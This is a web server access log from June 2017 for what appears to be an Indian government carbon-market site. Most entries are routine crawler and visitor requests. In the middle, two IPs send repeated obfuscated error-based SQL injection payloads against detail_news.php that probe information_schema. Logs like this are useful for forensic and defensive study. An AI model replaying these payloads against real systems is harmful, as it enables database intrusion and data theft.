40.77.167.35 - - [19/Jun/2017:06:50:05 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
220.181.108.166 - - [19/Jun/2017:06:51:23 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.19 - - [19/Jun/2017:06:54:33 +0530] "GET /project_details_view_report.php?id=564 HTTP/1.1" 200 13273 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.35 - - [19/Jun/2017:06:56:14 +0530] "GET /images/h_contactus.jpg HTTP/1.1" 200 21787 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:58:31 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:58:33 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:58:34 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.91 - - [19/Jun/2017:06:59:34 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /project_details_view.php?id=265 HTTP/1.1" 200 14646 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:35 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:36 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:36 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:36 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:36 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
47.247.0.192 - - [19/Jun/2017:07:00:36 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=265" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898"
202.46.52.74 - - [19/Jun/2017:07:01:25 +0530] "GET /project_details_view_report.php?id=379 HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [19/Jun/2017:07:04:38 +0530] "GET /project_details_view.php?id=149 HTTP/1.1" 200 14507 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [19/Jun/2017:07:06:37 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
195.154.176.15 - - [19/Jun/2017:07:10:32 +0530] "HEAD /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 - "-" "HttpComponents/1.1"
64.233.173.47 - - [19/Jun/2017:07:20:06 +0530] "GET /project_details_view.php?id=691 HTTP/1.1" 200 14223 "http://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:07:20:06 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:07:20:06 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:07:20:06 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:07:20:06 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:07:20:06 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:07:20:06 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:07:20:06 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:07:20:06 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:07:20:06 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:07:20:06 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:07:20:06 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:07:20:07 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:07:20:07 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:07:20:07 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=691" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
202.46.52.152 - - [19/Jun/2017:07:23:14 +0530] "GET /project_details_view_report.php?id=802 HTTP/1.1" 200 13212 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
123.125.71.112 - - [19/Jun/2017:07:24:44 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.88 - - [19/Jun/2017:07:24:44 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.89 - - [19/Jun/2017:07:24:45 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
92.142.34.80 - - [19/Jun/2017:07:27:48 +0530] "POST /detail_news.php?id='0=A HTTP/1.1" 200 11730 "http://www.cdmindia.gov.in/detail_news.php?id='0=A" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
92.142.34.80 - - [19/Jun/2017:07:27:52 +0530] "POST /detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a) HTTP/1.1" 200 18054 "http://www.cdmindia.gov.in/detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
5.62.63.182 - - [19/Jun/2017:07:28:02 +0530] "POST /detail_news.php?id='0=A HTTP/1.1" 200 11730 "http://www.cdmindia.gov.in/detail_news.php?id='0=A" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
5.62.63.182 - - [19/Jun/2017:07:28:02 +0530] "POST /detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a) HTTP/1.1" 200 18054 "http://www.cdmindia.gov.in/detail_news.php?id=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
66.102.6.111 - - [19/Jun/2017:07:29:30 +0530] "GET /project_details_view.php?id=426 HTTP/1.1" 200 14091 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [19/Jun/2017:07:29:31 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [19/Jun/2017:07:29:31 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [19/Jun/2017:07:29:31 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [19/Jun/2017:07:29:31 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [19/Jun/2017:07:29:31 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [19/Jun/2017:07:29:31 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [19/Jun/2017:07:29:31 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [19/Jun/2017:07:29:31 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.249.79.17 - - [19/Jun/2017:07:30:08 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
92.142.34.80 - - [19/Jun/2017:07:31:54 +0530] "POST /detail_news.php?id=3%22(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+%22 HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+\"" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
5.62.63.182 - - [19/Jun/2017:07:32:05 +0530] "POST /detail_news.php?id=3%22(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+%22 HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+\"" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
40.77.167.73 - - [19/Jun/2017:07:32:06 +0530] "GET /project_details_view.php?id=1186 HTTP/1.1" 200 16734 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
92.142.34.80 - - [19/Jun/2017:07:32:57 +0530] "POST /detail_news.php?id=3%22+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+%221%22=%221 HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+\"1\"=\"1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
5.62.63.182 - - [19/Jun/2017:07:33:05 +0530] "POST /detail_news.php?id=3%22+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+%221%22=%221 HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+and(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+\"1\"=\"1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
146.148.64.128 - - [19/Jun/2017:07:33:50 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
